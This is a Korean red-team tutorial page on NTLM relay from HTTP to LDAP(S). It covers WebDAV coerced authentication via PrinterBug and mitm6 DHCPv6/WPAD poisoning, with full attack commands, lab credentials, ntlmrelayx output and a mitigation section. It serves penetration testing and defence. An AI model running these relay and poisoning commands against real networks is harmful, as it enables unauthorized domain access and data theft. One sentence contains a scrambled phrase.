# HTTP to LDAP

HTTP to LDAP(S) 는 LDAP Signing 설정에 있어서 좀 더 자유로운 편이기 때문에 자주 사용되는 릴레이 공격이다. HTTP 트래픽을 받아올 때는 MITM6를 통한 DHCPv6 포이즈닝 혹은 Webdav 서비스를 이용한 강제 인증 (Petitpotam, Print Spooler) 등을 이용한다.&#x20;

* HTTP -> LDAP: LDAP Signing Disabled/Enabled 공격가능.  Required 일 시 공격 불가능.&#x20;
* HTTP -> LDAPS: LDAP Signing Disabled/Enabled/Required 모두 공격 가능. EPA (Extended Protection for Authentication) 사용시 공격 불가능.

HTTP to LDAP(S) 에는 크게 두 가지 공격 방식이 있다.&#x20;

1. Webdav + 강제인증: 타겟 서버가 Webdav 서비스를 실행중일 때 강제 인증을 통해 Webdav 서비스로부터 인증 트래픽을 받아낸 뒤, 이를 릴레이한다.&#x20;
2. MITM6: 타겟 서버가 DHCPv6 에 취약하다면  ipv6 DNS 서버를 스푸핑 한 뒤, ipv6 관련된 트래픽을 공격자 서버로 보낸다. 그 뒤, 이 트래픽을 릴레이한다.&#x20;

\#1 번의 경우 도메인 유저 맥락이 필요하기 때문에 도메인 장악 보다는 Webdav 호스트의 LDAP 특성을 조작해 장악하는 방식으로, 횡적 이동에 자주 사용된다.&#x20;

\#2 번의 경우 아무런 유저 계정 정보없이 머신 계정 생성 및 LDAP 정보 덤프가 가능하기 때문에 도메인 진입에 자주 사용된다.&#x20;

### 1. Webdav 강제 인증

Webdav 강제 인증에서는 강제 인증을 통해서 Webdav 서비스가 공격자에게 HTTP 트래픽을 보내도록 해야한다. 이를 위해서는 피해자공서버가격자의 IP 주소가 아닌 DNS 이름으로 트래픽을 보내도록 해야한다.&#x20;

때문에 공격자 서버의 DNS 엔트리를 생성해야한다. 이를 위해선 SPN 이 설정되어 있는 머신 계정이 필요하다.&#x20;

```
# 1. Webdav 확인 
webclientservicescanner choi.local/low:'Password123!'@192.168.40.0/24

# 2. 공격자 머신 계정 생성 
impacket-addcomputer choi.local/low:'Password123!' -dc-ip 192.168.40.150

[*] Successfully added machine account DESKTOP-405ONBSD$ with password MV6AVqCWU7vnChAVPH5RICbBtBzkJdbk.

# 3. 공격자 머신 계정의 DNS 엔트리 생성 - 공격자 서버의 IP 주소 지정 (192.168.40.132)
python3 dnstool.py -u choi.local\\'DESKTOP-405ONBSD$' -p 'MV6AVqCWU7vnChAVPH5RICbBtBzkJdbk' -a add -r relayx -d 192.168.40.132 ldaps://192.168.40.150

# 4. Webdav + Printerbug 강제 인증 
python3 printerbug.py choi.local/low:'Password123!'@192.168.40.151 kali@80/choiredteam 

# 5. ntlmrelayx 를 이용해 LDAP 정보 덤프
./ntlmrelayx.py -t ldaps://192.168.40.150 --no-da --no-acl -smb2support --remove-mic --no-validate-priv

[*] HTTPD(80): Authenticating against ldaps://192.168.40.150 as / SUCCEED
[*] Assuming relayed user has privileges to escalate a user via ACL attack
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!

# 6. 공격 완료 후 머신 계정 및 DNS 엔트리 삭제 - 도메인 관리자 권한 필요 
impacket-addcomputer -delete choi.local/Administrator:'Password123!' -computer-name 'DESKTOP-405ONBSD$'
python3 dnstool.py -u choi.local\\'DESKTOP-405ONBSD$' -p 'MV6AVqCWU7vnChAVPH5RICbBtBzkJdbk' -a remove -r relayx -d 192.168.40.132 ldaps://192.168.40.150
```



### 2. MITM6  &#x20;

```
# 1. MITM6 세팅 
python3 mitm6.py -d <도메인> --ignore-nofqdn

# 1-1. 특정 호스트만 화이트리스트 처리 후 mitm6 공격 
python3 mitm6.py -d <도메인> --ignore-nofqdn -hw <호스트 FQDN>
python3 mitm6.py -d choi.local --ignore-nofqdn -hw wkstn01.choi.local

# 2. ntlmrelayx 세팅 
python3 ntlmrelayx.py -t ldap://<ip> -wh <wpad-이름-아무거나> -6 --no-da --no-acl
python3 ntlmrelayx.py -t ldap://192.168.40.150 -wh choipad -6 --no-da --no-acl

# ntlmrelayx 공격 결과 
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Connection from ::ffff:192.168.40.151 controlled, attacking target ldap://192.168.40.150
[*] HTTPD(80): Authenticating against ldap://192.168.40.150 as CHOI/ADMINISTRATOR SUCCEED
[*] Domain info dumped into lootdir!

```

ntlmrelayx 의 기본적인 LDAP 공격은 도메인 어드민 유저를 생성한다거나 ACL 공격을 함부로 진행하는 등의 고객사 네트워크에 사용하기엔 좀 위험한 공격들이 있다. 따라서 `--no-da` 와 `--no-acl` 등의 플래그를 이용해서 기본 공격들을 진행하지 않는다.&#x20;

위 실습에서는 오로지 도메인 정보만 덤프하는 아주 기본적인 공격을 진행했다. 사실상 BloodHound 를 실행한 것과 같은 공격이다.&#x20;



### 대응 방안&#x20;

* HTTP -> LDAP: Webdav 가 필요 없는 서버들은 Webdav를 비활성화 시킨다.&#x20;
* HTTP -> LDAP: LDAP Signing을 Required 로 설정한다. `(Default Domain Controller Policy 혹은 GPO`) `> Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies >  Security Options > Domain controller: LDAP server signing requirement` - REQUIRED 로 설정
* HTTP -> LDAPS: Extended Protection for Authentication (EPA) 를 설정한다.&#x20;
  * IIS > 왼쪽의 Sites 에서 EPA 를 설정할 사이트 ("a") 찾기 > Authentication > Windows Authentication Enable  > Windows Authentication Advanced Settings > Extended Protection : REQUIRED 로 설정&#x20;

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>



### MISC&#x20;

* DHCPv6 포이즈닝 관련 테스트를 할때는 nic을 껐다 켰다 하는게 제일 빠른 것 같다.&#x20;
* wpad 관련된 공격에서는 컴퓨터를 재부팅하거나 재로그인 하는 것이 도움될 때가 있다.
* Webdav 강제 인증 공격에서는 실제 공격자의 DNS 엔트리가 필요하다. 만약 공격자 전용 리눅스 VM 이라면 add-computer + dnstool 로 머신 계정 생성 + DNS 엔트리를 머신계정과 공격자 VM으로 묶어준다 (relayx.choi.local == 192.168.40.132).&#x20;
  * 만약 이미 윈도우 호스트 중 한 대를 장악한 공격자라면 머신 계정을 생성할 필요도, DNS 엔트리를 바꿀 필요도 없다. 그저 장악한 호스트로 Webdav 강제 인증을 보내주기만 하면 된다.&#x20;

### 레퍼런스&#x20;

{% embed url="https://github.com/Hackndo/WebclientServiceScanner" %}

{% embed url="https://github.com/dirkjanm/krbrelayx" %}

{% embed url="https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/" %}
